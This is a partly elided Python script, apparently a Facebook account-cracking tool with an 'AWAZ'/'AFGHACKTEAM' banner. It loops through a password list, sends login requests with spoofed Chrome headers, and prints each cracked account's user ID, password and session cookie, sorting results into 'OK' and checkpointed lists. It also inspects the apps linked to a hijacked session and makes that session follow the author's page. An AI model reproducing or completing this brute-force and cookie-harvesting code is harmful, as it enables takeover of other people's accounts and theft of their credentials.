...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{AWAZ}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{AWAZ}'%(M))
        for i in range(len(game)):
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/AwazTech/', {
...
\033[1;37m================= \33[32;45mAWAZ\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mAWAZ\33[0;m\033[1;32m && \033[1;33mAWAZ\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Mohammad Tanha
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mMohammadTanha
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mSH.T
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mAWAZ\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO SHT TOOL\33[0;m
 
\033[1;37m================== \33[32;45mAFGHACKTEAM\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            "scheme": 'https',
             ...
             'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5623.216", "Google Chrome";v="113.0.5623.216"',
             'sec-ch-ua-mobile': '?1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(AWAZ-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(AWAZ-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[AWAZ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
